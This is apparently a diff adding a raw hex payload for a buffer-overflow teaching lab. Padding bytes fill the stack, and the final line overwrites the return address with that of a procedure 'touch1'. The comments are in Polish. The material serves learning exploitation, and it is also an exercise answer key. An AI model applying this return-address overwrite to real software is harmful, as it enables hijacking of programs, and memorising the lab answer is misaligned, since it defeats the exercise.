@@ -1,0 +1,8 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00  /* Zapełnienie stosu bezużytecznymi danymi */
+91 1b 40 00 00 00 00 00  /* nadpisanie adresu powrotu na adres proceduty touch1 */
